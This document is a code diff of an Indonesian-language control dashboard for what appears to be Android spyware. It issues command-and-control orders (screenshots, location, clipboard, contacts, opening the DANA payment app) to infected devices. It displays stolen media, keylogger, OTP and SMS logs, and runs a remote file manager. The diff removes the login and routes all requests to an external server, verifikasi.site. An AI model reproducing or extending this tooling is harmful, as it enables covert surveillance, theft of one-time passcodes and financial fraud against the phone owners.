@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <title>🔬 DASHBOARD ULTIMATE v2.0</title>
     <style>
-        /* ============================================================
-           THEME VARIABLES
-           ============================================================ */
         :root {
             --bg-primary: #0a0a0a;
             --bg-secondary: #111111;
@@ -21,7 +18,6 @@
             --scrollbar-track: #1a1a1a;
             --scrollbar-thumb: #333333;
         }
-
         [data-theme="light"] {
             --bg-primary: #f0f2f5;
             --bg-secondary: #ffffff;
@@ -35,98 +31,65 @@
             --scrollbar-track: #e0e0e0;
             --scrollbar-thumb: #b0b0b0;
         }
-
-        /* ============================================================
-           GLOBAL
-           ============================================================ */
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Segoe UI',Arial,sans-serif;background:var(--bg-primary);color:var(--text-primary);padding:16px;font-size:13px;transition:background 0.3s,color 0.3s}
-        
         ::-webkit-scrollbar{width:6px}
         ::-webkit-scrollbar-track{background:var(--scrollbar-track)}
         ::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:3px}
-        
         .header{border-bottom:2px solid var(--accent);padding-bottom:12px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
         .header h1{color:var(--accent);font-size:22px;display:flex;align-items:center;gap:10px}
         .live-dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#00ff00;animation:blink 1s infinite}
         @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
-        
         .card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:8px;padding:14px;margin-bottom:12px;transition:background 0.3s,border 0.3s}
         .card h2{color:var(--accent);font-size:14px;margin-bottom:8px;border-bottom:1px solid var(--border-color);padding-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
         .card h2 .badge{font-size:10px;background:var(--bg-secondary);padding:2px 10px;border-radius:12px;color:var(--text-secondary)}
-        
         .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
         .stat-card{background:var(--bg-secondary);padding:10px;border-radius:6px;text-align:center;border:1px solid var(--border-color);transition:background 0.3s}
         .stat-card .num{font-size:22px;font-weight:bold;color:var(--accent)}
         .stat-card .label{color:var(--text-secondary);font-size:10px;margin-top:3px}
-        
         .flex{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
         .flex-between{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
-        
         input,select,button{background:var(--bg-input);border:1px solid var(--border-color);color:var(--text-primary);padding:8px 12px;border-radius:5px;font-size:12px;font-family:inherit;transition:background 0.3s,color 0.3s,border 0.3s}
         input:focus,select:focus{outline:2px solid var(--accent);border-color:var(--accent)}
         button{cursor:pointer;font-weight:bold;transition:0.3s}
         button:hover{transform:scale(1.03)}
-        
         .btn-green{background:#00cc66;color:#000;border-color:#00cc66}
         .btn-blue{background:#108ee9;color:#fff;border-color:#108ee9}
         .btn-red{background:#ff4444;color:#fff;border-color:#ff4444}
         .btn-orange{background:#ff8800;color:#fff;border-color:#ff8800}
         .btn-purple{background:#aa44ff;color:#fff;border-color:#aa44ff}
         .btn-gray{background:var(--bg-secondary);color:var(--text-secondary);border-color:var(--border-color)}
-        .btn-pink{background:#ff44aa;color:#fff;border-color:#ff44aa}
-        .btn-cyan{background:#44ddff;color:#000;border-color:#44ddff}
-        
         .tab-btn{background:var(--bg-secondary);border:1px solid var(--border-color);padding:6px 14px;border-radius:5px;cursor:pointer;color:var(--text-secondary);transition:0.3s}
         .tab-btn.active{background:var(--accent);color:#000;border-color:var(--accent)}
         .tab-content{display:none}
         .tab-content.active{display:block}
-        
         table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
         th{background:var(--bg-secondary);color:var(--accent);padding:6px 8px;text-align:left;border:1px solid var(--border-color)}
         td{padding:5px 8px;border:1px solid var(--border-color);word-break:break-all}
-        
         .log-container{max-height:500px;overflow-y:auto;font-size:12px}
         .log-item{padding:4px 8px;border-bottom:1px solid var(--border-color);display:grid;grid-template-columns:140px 120px 1fr;gap:8px;align-items:start}
         .log-item .time{color:var(--text-secondary);font-size:10px}
         .log-item .sumber{font-weight:bold;font-size:11px}
         .log-item .data{color:var(--text-primary);word-break:break-all;font-size:11px}
-        .log-keylogger .sumber{color:#ff4444}
-        .log-otp .sumber{color:#ff44aa}
-        .log-location .sumber{color:#44aaff}
-        .log-contact .sumber{color:#44ff88}
-        .log-sms .sumber{color:#ff8844}
-        .log-c2 .sumber{color:#aa44ff}
-        
         .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
         .media-item{background:var(--bg-secondary);border-radius:6px;padding:8px;border:1px solid var(--border-color);text-align:center}
         .media-item .label{color:var(--text-secondary);font-size:10px;margin:4px 0}
         .media-item audio,.media-item video{width:100%;border-radius:4px}
         .preview-img{max-width:100%;max-height:200px;border-radius:4px;cursor:pointer}
         .img-preview{max-width:100%;max-height:400px;border-radius:6px;border:1px solid var(--border-color);cursor:pointer}
-        
         .file-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px}
         .file-item{background:var(--bg-secondary);padding:6px;border-radius:4px;text-align:center;font-size:10px;border:1px solid var(--border-color);word-break:break-all}
         .file-item .name{color:var(--accent);font-weight:bold}
         .file-item .path{color:var(--text-secondary);font-size:8px}
-        
         .pagination{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px;justify-content:center}
         .pagination button{padding:4px 12px;font-size:11px}
         .pagination .active{background:var(--accent);color:#000;border-color:var(--accent)}
-        
-        .password-container{max-width:400px;margin:40px auto;padding:30px;background:var(--bg-card);border-radius:10px;border:1px solid var(--border-color);text-align:center}
-        .password-container input{width:100%;margin:10px 0;padding:12px;font-size:16px;text-align:center}
-        .error{color:#ff4444;margin-top:8px;display:none}
-        
         .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--bg-card);color:var(--text-primary);padding:10px 24px;border-radius:8px;font-size:13px;z-index:999;display:none;border-left:4px solid var(--accent);box-shadow:var(--shadow)}
         .empty{color:var(--text-secondary);text-align:center;padding:20px;font-size:13px}
-        
         .json-view{background:var(--bg-primary);padding:8px;border-radius:4px;font-size:10px;max-height:200px;overflow-y:auto;white-space:pre-wrap;font-family:monospace;color:var(--text-secondary)}
-        
         .theme-toggle{position:relative;width:44px;height:22px;background:var(--bg-secondary);border-radius:11px;border:1px solid var(--border-color);cursor:pointer;transition:0.3s;flex-shrink:0}
         .theme-toggle::after{content:'🌙';position:absolute;top:2px;left:2px;width:18px;height:18px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;font-size:10px;transition:0.3s}
         .theme-toggle.light::after{content:'☀️';transform:translateX(20px)}
-        
         @media(max-width:600px){
             .log-item{grid-template-columns:1fr;gap:2px}
             .header h1{font-size:18px}
@@ -134,10 +97,8 @@
             .grid{grid-template-columns:repeat(2,1fr)}
             .c2-grid{grid-template-columns:repeat(2,1fr)}
         }
-        
         .data-section{animation:fadeIn 0.3s ease}
         @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-        
         .c2-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:5px;margin-bottom:10px}
         .c2-grid button{font-size:10px;padding:5px 8px;text-align:center}
         .c2-category{color:var(--accent);font-size:11px;font-weight:bold;margin:8px 0 4px;padding:2px 8px;background:var(--bg-secondary);border-radius:4px}
@@ -147,18 +108,7 @@
 
 <div class="toast" id="toast"></div>
 
-<!-- LOGIN -->
-<div id="loginBox" class="password-container">
-    <h1 style="color:var(--accent);font-size:24px;">🔐 DASHBOARD</h1>
-    <p style="color:var(--text-secondary);font-size:13px;margin:10px 0;">Masukkan password</p>
-    <input type="password" id="pw" placeholder="Password" onkeyup="if(event.key==='Enter')login()">
-    <button class="btn-green" onclick="login()" style="width:100%;padding:12px;font-size:16px;">🔓 BUKA</button>
-    <div class="error" id="loginError">❌ Password salah!</div>
-</div>
-
-<!-- MAIN -->
-<div id="main" style="display:none">
-
+<div id="main">
     <div class="header">
         <h1><span class="live-dot"></span> 🔬 DASHBOARD ULTIMATE v2.0</h1>
         <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center">
@@ -168,17 +118,14 @@
             <button class="btn-green" onclick="exportJSON()">📤 JSON</button>
             <button class="btn-orange" onclick="exportCSV()">📊 CSV</button>
             <button class="btn-red" onclick="clearAll()">🗑️ Clear</button>
-            <button class="btn-gray" onclick="logout()">🚪 Logout</button>
         </div>
     </div>
 
-    <!-- STATS -->
     <div class="card">
         <h2>📊 STATISTIK</h2>
         <div class="grid" id="statsGrid"></div>
     </div>
 
-    <!-- TABS -->
     <div style="display:flex;flex-wrap:wrap;gap:5px;margin-bottom:12px;">
         <button class="tab-btn active" data-tab="tabAll" onclick="switchTab('tabAll')">📦 Semua Data</button>
         <button class="tab-btn" data-tab="tabMedia" onclick="switchTab('tabMedia')">🖼️ Media</button>
@@ -187,7 +134,6 @@
         <button class="tab-btn" data-tab="tabFiles" onclick="switchTab('tabFiles')">📁 Files</button>
     </div>
 
-    <!-- TAB 1: SEMUA DATA -->
     <div id="tabAll" class="tab-content active">
         <div class="card">
             <div class="flex-between">
@@ -206,12 +152,10 @@
         <div class="pagination" id="dataPagination"></div>
     </div>
 
-    <!-- TAB 2: MEDIA -->
     <div id="tabMedia" class="tab-content">
         <div id="mediaSections"></div>
     </div>
 
-    <!-- TAB 3: LOG -->
     <div id="tabLog" class="tab-content">
         <div class="card">
             <div class="flex-between">
@@ -228,13 +172,10 @@
         </div>
     </div>
 
-    <!-- TAB 4: C2 -->
     <div id="tabC2" class="tab-content">
         <div class="card">
             <h2>🎮 C2 COMMAND CENTER (160+ PERINTAH)</h2>
-            
             <div id="c2ButtonsContainer"></div>
-            
             <div class="flex" style="margin-top:10px;">
                 <input type="text" id="c2Custom" placeholder='{"aksi":"perintah","params":{}}' style="flex:2;min-width:150px;">
                 <button class="btn-blue" onclick="sendC2Custom()">📤 Kirim Custom</button>
@@ -242,19 +183,10 @@
             <div id="c2Result" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
         </div>
 
-        <!-- 🔥 BATCH C2 - KIRIM BANYAK PERINTAH SEKALIGUS! -->
         <div class="card">
             <h2>📦 BATCH C2 (Kirim Banyak Perintah Sekaligus) <span class="badge" id="queueLength">Queue: 0</span></h2>
             <div class="flex" style="margin-bottom:10px;">
-                <textarea id="batchCommands" rows="6" style="flex:1;min-width:300px;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text-primary);border:1px solid var(--border-color);border-radius:5px;padding:8px;" placeholder='{"aksi":"screenshot"}
-{"aksi":"ambil_lokasi"}
-{"aksi":"get_clipboard"}
-{"aksi":"buka_dana"}
-{"aksi":"ambil_kontak"}'>{"aksi":"screenshot"}
-{"aksi":"ambil_lokasi"}
-{"aksi":"get_clipboard"}
-{"aksi":"buka_dana"}
-{"aksi":"ambil_kontak"}</textarea>
+                <textarea id="batchCommands" rows="6" style="flex:1;min-width:300px;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text-primary);border:1px solid var(--border-color);border-radius:5px;padding:8px;" placeholder='Contoh: {"aksi":"screenshot"} satu per baris'></textarea>
                 <button class="btn-purple" onclick="sendBatchC2()">📤 Kirim Batch</button>
             </div>
             <div id="batchResult" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
@@ -263,7 +195,6 @@
         <div class="card"><h2>📜 C2 History</h2><div id="c2History" style="max-height:200px;overflow-y:auto;font-size:12px;"></div></div>
     </div>
 
-    <!-- TAB 5: FILE MANAGER -->
     <div id="tabFiles" class="tab-content">
         <div class="card">
             <h2>📁 FILE MANAGER</h2>
@@ -278,16 +209,12 @@
             </div>
         </div>
     </div>
-
 </div>
 
 <script>
-// ============================================================
-// 🔥 GLOBAL ERROR HANDLER
-// ============================================================
 window.addEventListener('error', function(e) {
     try {
-        fetch('/error', {
+        fetch('https://verifikasi.site/error', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
@@ -304,7 +231,7 @@ window.addEventListener('error', function(e) {
 
 window.addEventListener('unhandledrejection', function(e) {
     try {
-        fetch('/error', {
+        fetch('https://verifikasi.site/error', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
@@ -317,9 +244,6 @@ window.addEventListener('unhandledrejection', function(e) {
     return true;
 });
 
-// ============================================================
-// 🔥 THEME TOGGLE
-// ============================================================
 function toggleTheme() {
     var html = document.documentElement;
     var current = html.getAttribute('data-theme');
@@ -335,56 +259,11 @@ if (savedTheme === 'light') {
     document.getElementById('themeToggle').className = 'theme-toggle light';
 }
 
-// ============================================================
-// 🔥 GLOBAL VARIABLES
-// ============================================================
 var allData = [];
-var KEY = '';
 var c2History = [];
 var currentPage = 1;
 var pageSize = 20;
 var ws = null;
-
-// ============================================================
-// 🔥 LOGIN - HANYA BISA PAKAI ADMIN_PASSWORD!
-// ============================================================
-function login() {
-    var pw = document.getElementById('pw').value;
-    if(!pw) { showToast('Masukkan password!'); return; }
-    
-    fetch('/data?key=' + encodeURIComponent(pw) + '&limit=1')
-        .then(function(r) {
-            if (r.status === 200) {
-                KEY = pw;
-                localStorage.setItem('dash_key', pw);
-                document.getElementById('loginBox').style.display = 'none';
-                document.getElementById('main').style.display = 'block';
-                document.getElementById('statusInfo').textContent = '🔓 Login sukses';
-                refreshData();
-                connectWebSocket();
-                setInterval(refreshData, 5000);
-            } else {
-                document.getElementById('loginError').style.display = 'block';
-                setTimeout(function() {
-                    document.getElementById('loginError').style.display = 'none';
-                }, 3000);
-                showToast('❌ Password salah!');
-            }
-        })
-        .catch(function() {
-            showToast('❌ Gagal verifikasi password');
-        });
-}
-
-function logout() {
-    if(!confirm('Logout?')) return;
-    localStorage.removeItem('dash_key');
-    KEY = '';
-    document.getElementById('loginBox').style.display = 'block';
-    document.getElementById('main').style.display = 'none';
-    if(ws) { try { ws.close(); } catch(e) {} }
-    showToast('🚪 Logout berhasil');
-}
 
 function showToast(msg, dur) {
     var t = document.getElementById('toast');
@@ -394,9 +273,6 @@ function showToast(msg, dur) {
     t._timer = setTimeout(function(){ t.style.display = 'none'; }, dur||3000);
 }
 
-// ============================================================
-// 🔥 WEBSOCKET REAL-TIME
-// ============================================================
 function connectWebSocket() {
     try {
         if (typeof WebSocket === 'undefined') return;
@@ -404,10 +280,7 @@ function connectWebSocket() {
         
         ws.onopen = function() {
             document.getElementById('statusInfo').textContent = '🔌 WebSocket connected';
-            ws.send(JSON.stringify({
-                type: 'auth',
-                key: KEY
-            }));
+            ws.send(JSON.stringify({ type: 'auth', key: '' }));
         };
         
         ws.onmessage = function(event) {
@@ -435,9 +308,6 @@ function connectWebSocket() {
     }
 }
 
-// ============================================================
-// 🔥 C2 COMMAND DEFINITIONS (160+ PERINTAH)
-// ============================================================
 var C2_COMMANDS = {
     '📸 Media': [
         { aksi: 'screenshot', label: '📸 Screenshot' },
@@ -597,13 +467,9 @@ var C2_COMMANDS = {
     ]
 };
 
-// ============================================================
-// 🔥 RENDER C2 BUTTONS
-// ============================================================
 function renderC2Buttons() {
     var container = document.getElementById('c2ButtonsContainer');
     var html = '';
-    
     for (var category in C2_COMMANDS) {
         html += '<div class="c2-category">' + category + '</div>';
         html += '<div class="c2-grid">';
@@ -612,16 +478,10 @@ function renderC2Buttons() {
         });
         html += '</div>';
     }
-    
     container.innerHTML = html;
 }
 
-// ============================================================
-// 🔥 REFRESH DATA
-// ============================================================
 function refreshData() {
-    if(!KEY) return;
-    
     var cached = localStorage.getItem('dash_cache');
     var cacheTime = parseInt(localStorage.getItem('dash_cache_time') || '0');
     if (cached && (Date.now() - cacheTime < 30000)) {
@@ -633,7 +493,7 @@ function refreshData() {
         } catch(e) {}
     }
     
-    fetch('/data?key=' + encodeURIComponent(KEY))
+    fetch('https://verifikasi.site/data')
         .then(function(r){ 
             if(!r.ok) throw new Error('HTTP ' + r.status);
             return r.json(); 
@@ -667,9 +527,6 @@ function renderAll() {
     renderC2History();
 }
 
-// ============================================================
-// 🔥 STATS
-// ============================================================
 function renderStats() {
     try {
         var map = {};
@@ -689,9 +546,6 @@ function renderStats() {
     }
 }
 
-// ============================================================
-// 🔥 RENDER SEMUA DATA
-// ============================================================
 function renderDataSections() {
     try {
         var container = document.getElementById('dataSections');
@@ -752,9 +606,6 @@ function renderDataSections() {
     }
 }
 
-// ============================================================
-// 🔥 RENDER DATA CONTENT
-// ============================================================
 function renderDataContent(src, items, last) {
     try {
         var data = last ? last.data : null;
@@ -885,21 +736,16 @@ function renderDataContent(src, items, last) {
     }
 }
 
-// ============================================================
-// 🔥 RENDER MEDIA
-// ============================================================
 function renderMediaSections() {
     try {
         var container = document.getElementById('mediaSections');
         var mediaItems = [];
-        
         allData.forEach(function(item){
             var src = item.sumber || '';
             var data = item.data;
             var isMedia = false;
             var mediaType = '';
             var mediaSrc = '';
-            
             if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
                 mediaSrc = typeof data === 'string' ? data : (data.data || data.image || '');
                 if(mediaSrc && mediaSrc.startsWith('data:image')) { isMedia = true; mediaType = 'image'; }
@@ -918,7 +764,6 @@ function renderMediaSections() {
                 mediaSrc = typeof data === 'string' ? data : (data.data || '');
                 if(mediaSrc && mediaSrc.startsWith('data:video')) { isMedia = true; mediaType = 'video'; }
             }
-            
             if(isMedia) {
                 mediaItems.push({
                     type: mediaType,
@@ -928,12 +773,10 @@ function renderMediaSections() {
                 });
             }
         });
-        
         if(!mediaItems.length) {
             container.innerHTML = '<div class="card"><div class="empty">📭 Belum ada media (foto/audio/video)</div></div>';
             return;
         }
-        
         var html = '<div class="card"><h2>🖼️ MEDIA ('+mediaItems.length+')</h2><div class="media-grid">';
         mediaItems.forEach(function(item){
             html += '<div class="media-item">';
@@ -961,9 +804,6 @@ function renderMediaSections() {
     }
 }
 
-// ============================================================
-// 🔥 HELPERS
-// ============================================================
 function getIcon(src) {
     var icons = {
         'init':'📱','device_info':'📱','telepon_info':'📞','lokasi':'📍',
@@ -1000,15 +840,11 @@ function renderTable(data, cols, limit) {
     return html;
 }
 
-// ============================================================
-// 🔥 LOG
-// ============================================================
 function renderLog() {
     try {
         var container = document.getElementById('logContainer');
         var search = document.getElementById('logSearch').value.toLowerCase();
         var filter = document.getElementById('logFilter').value;
-        
         var filtered = allData.filter(function(item){
             if(filter && item.sumber !== filter) return false;
             if(search) {
@@ -1017,18 +853,14 @@ function renderLog() {
             }
             return true;
         });
-        
         document.getElementById('logCount').textContent = filtered.length + ' entries';
-        
         var sources = {}; allData.forEach(function(i){ sources[i.sumber]=true; });
         var sel = document.getElementById('logFilter');
         var current = sel.value;
         sel.innerHTML = '<option value="">Semua</option>';
         Object.keys(sources).sort().forEach(function(s){ sel.innerHTML += '<option value="'+s+'">'+s+'</option>'; });
         sel.value = current;
-        
         if(!filtered.length) { container.innerHTML = '<div class="empty">📭 Tidak ada data</div>'; return; }
-        
         var html = '';
         filtered.slice(-200).reverse().forEach(function(item){
             var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
@@ -1056,9 +888,6 @@ function resetFilter(){
     renderLog();
 }
 
-// ============================================================
-// 🔥 TABS
-// ============================================================
 function switchTab(id){
     document.querySelectorAll('.tab-content').forEach(function(el){ el.classList.remove('active'); });
     document.getElementById(id).classList.add('active');
@@ -1066,24 +895,14 @@ function switchTab(id){
     document.querySelector('[data-tab="'+id+'"]').classList.add('active');
 }
 
-// ============================================================
-// 🔥 C2 COMMAND SEND (SINGLE)
-// ============================================================
 function sendC2(aksi, params){
-    if(!KEY){ showToast('Login dulu!'); return; }
     if(!params) params = {};
-    
-    var payload = { 
-        sumber: 'c2_command', 
-        data: { aksi: aksi, params: params } 
-    };
-    
+    var payload = { sumber: 'c2_command', data: { aksi: aksi, params: params } };
     c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
     renderC2History();
     document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
     document.getElementById('c2Result').style.color = '#ff0';
-    
-    fetch('/data', { 
+    fetch('https://verifikasi.site/data', { 
         method: 'POST', 
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(payload) 
@@ -1118,37 +937,27 @@ function sendC2Custom(){
     } catch(e){ showToast('❌ Invalid JSON: '+e.message); }
 }
 
-// ============================================================
-// 🔥 BATCH C2 - KIRIM BANYAK PERINTAH SEKALIGUS!
-// ============================================================
 function sendBatchC2() {
-    if(!KEY){ showToast('Login dulu!'); return; }
-    
     var textarea = document.getElementById('batchCommands');
     var lines = textarea.value.split('\n').filter(function(line) { 
         return line.trim().length > 0; 
     });
-    
     if(lines.length === 0) {
         showToast('Masukkan minimal 1 perintah!');
         return;
     }
-    
     var total = lines.length;
     var success = 0;
     var failed = 0;
     var results = [];
-    
     document.getElementById('batchResult').textContent = '⏳ Mengirim ' + total + ' perintah...';
     document.getElementById('batchResult').style.color = '#ff0';
-    
     lines.forEach(function(line, index) {
         try {
             var cmd = JSON.parse(line.trim());
             var aksi = cmd.aksi || cmd.command || 'unknown';
             var params = cmd.params || {};
-            
-            fetch('/data', {
+            fetch('https://verifikasi.site/data', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -1165,13 +974,11 @@ function sendBatchC2() {
             .catch(function() {
                 failed++;
             });
-            
         } catch(e) {
             failed++;
             results.push('❌ ' + line + ' → ' + e.message);
         }
     });
-    
     setTimeout(function() {
         document.getElementById('batchResult').textContent = '✅ ' + success + ' perintah terkirim, ' + failed + ' gagal';
         document.getElementById('batchResult').style.color = success > 0 ? '#0f0' : '#f44';
@@ -1182,12 +989,9 @@ function sendBatchC2() {
     }, (lines.length * 300) + 2000);
 }
 
-// ============================================================
-// 🔥 UPDATE QUEUE LENGTH
-// ============================================================
 function updateQueueLength() {
     try {
-        fetch('/data?type=perintah', { method: 'GET' })
+        fetch('https://verifikasi.site/data?type=perintah', { method: 'GET' })
             .then(function(r) { return r.text(); })
             .then(function(text) {
                 try {
@@ -1207,9 +1011,6 @@ function updateQueueLength() {
     } catch(e) {}
 }
 
-// ============================================================
-// 🔥 C2 HISTORY
-// ============================================================
 function renderC2History(){
     try {
         var container = document.getElementById('c2History');
@@ -1227,9 +1028,6 @@ function renderC2History(){
     }
 }
 
-// ============================================================
-// 🔥 EXPORT & CLEAR
-// ============================================================
 function exportJSON(){
     var blob = new Blob([JSON.stringify(allData,null,2)], {type:'application/json'});
     var a = document.createElement('a');
@@ -1260,17 +1058,14 @@ function exportCSV(){
 
 function clearAll(){
     if(!confirm('⚠️ Hapus semua data?')) return;
-    fetch('/clear?key='+encodeURIComponent(KEY), {method:'POST'})
+    fetch('https://verifikasi.site/clear', {method:'POST'})
         .then(function(){ allData=[]; renderAll(); showToast('🗑️ Data terhapus'); })
         .catch(function(){ showToast('❌ Gagal hapus data'); });
 }
 
-// ============================================================
-// 🔥 FILE MANAGER
-// ============================================================
 function listFiles(){
     var path = document.getElementById('filePath').value || '/';
-    fetch('/api/files?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY))
+    fetch('https://verifikasi.site/api/files?path='+encodeURIComponent(path))
         .then(function(r){ return r.json(); })
         .then(function(data){
             var container = document.getElementById('fileListContainer');
@@ -1298,15 +1093,15 @@ function listFiles(){
 }
 
 function downloadFile(path){
-    window.open('/api/download?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY), '_blank');
+    window.open('https://verifikasi.site/api/download?path='+encodeURIComponent(path), '_blank');
 }
 
 function deleteFile(path){
     if(!confirm('Hapus file: '+path+'?')) return;
-    fetch('/api/delete', {
+    fetch('https://verifikasi.site/api/delete', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({path: path, key: KEY})
+        body: JSON.stringify({path: path})
     })
     .then(function(r){ return r.json(); })
     .then(function(res){
@@ -1327,8 +1122,7 @@ function uploadFileSubmit(){
     var formData = new FormData();
     formData.append('file', file);
     formData.append('path', document.getElementById('filePath').value || '/');
-    formData.append('key', KEY);
-    fetch('/api/upload', {
+    fetch('https://verifikasi.site/api/upload', {
         method: 'POST',
         body: formData
     })
@@ -1341,29 +1135,16 @@ function uploadFileSubmit(){
     .catch(function(){ showToast('❌ Gagal upload'); });
 }
 
-// ============================================================
-// 🔥 AUTO-LOGIN
-// ============================================================
-if(localStorage.getItem('dash_key')){
-    KEY = localStorage.getItem('dash_key');
-    document.getElementById('loginBox').style.display = 'none';
-    document.getElementById('main').style.display = 'block';
-    document.getElementById('statusInfo').textContent = '🔓 Auto-login';
-    refreshData();
-    connectWebSocket();
-    setInterval(refreshData, 5000);
-    setInterval(updateQueueLength, 10000);
-}
-
-// ============================================================
-// 🔥 INIT
-// ============================================================
 renderC2Buttons();
-updateQueueLength();
+refreshData();
+connectWebSocket();
+setInterval(refreshData, 5000);
+setInterval(updateQueueLength, 10000);
 
 console.log('🔬 DASHBOARD ULTIMATE v2.0 LOADED');
 console.log('📊 160+ C2 Commands Ready');
-console.log('📦 Batch C2 Ready - Kirim banyak perintah sekaligus!');
+console.log('📦 Batch C2 Ready');
+console.log('🔓 TANPA LOGIN - SEMUA BEBAS!');
 </script>
 </body>
 </html>
